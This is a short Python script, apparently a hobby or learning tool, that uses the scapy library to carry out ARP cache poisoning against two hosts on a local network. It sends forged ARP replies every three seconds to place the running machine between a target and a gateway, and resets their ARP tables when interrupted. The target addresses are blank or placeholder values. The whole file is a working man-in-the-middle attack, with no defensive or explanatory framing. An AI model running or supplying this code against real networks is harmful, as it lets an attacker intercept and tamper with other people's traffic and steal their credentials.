import scapy.all as scapy
import time


def GetMacAdress(ip):

    arpRequestPacket = scapy.ARP(pdst=ip)
    #scapy.ls(scapy.ARP())
    broadcastPacket = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    #scapy.ls(scapy.Ether())
    combinedPacket = broadcastPacket/arpRequestPacket
    answeredList = scapy.srp(combinedPacket,timeout=1, verbose=False)[0]

    return answeredList[0][1].hwsrc

def ArpPoisoning(targetIP, poisonedIP):

    targetMac = GetMacAdress(targetIP)
    arpResponse = scapy.ARP(op=2, pdst=targetIP, hwdst=targetMac, psrc=poisonedIP)
    scapy.send(arpResponse, verbose=False)
    #scapy.ls(scapy.ARP())

def ResetOperation(fooledIP, gatewayIP):

    fooledMac = GetMacAdress(fooledIP)
    gatewayMac = GetMacAdress(gatewayIP)
    arpResponse = scapy.ARP(op=2, pdst=fooledIP, hwdst=fooledMac, psrc=gatewayIP, hwsrc=gatewayMac)
    scapy.send(arpResponse, verbose=False, count = 6)


number = 0
try:
    while True:

        print("\rTotal packages sent {}".format(number),end="")

        ArpPoisoning("", "")
        ArpPoisoning("1", "")

        time.sleep(3)
        number += 2

        #You can stop the loop by ctrl+c.
except KeyboardInterrupt:
    print("\nQuit&Reset")
    ResetOperation("","")
    ResetOperation("","")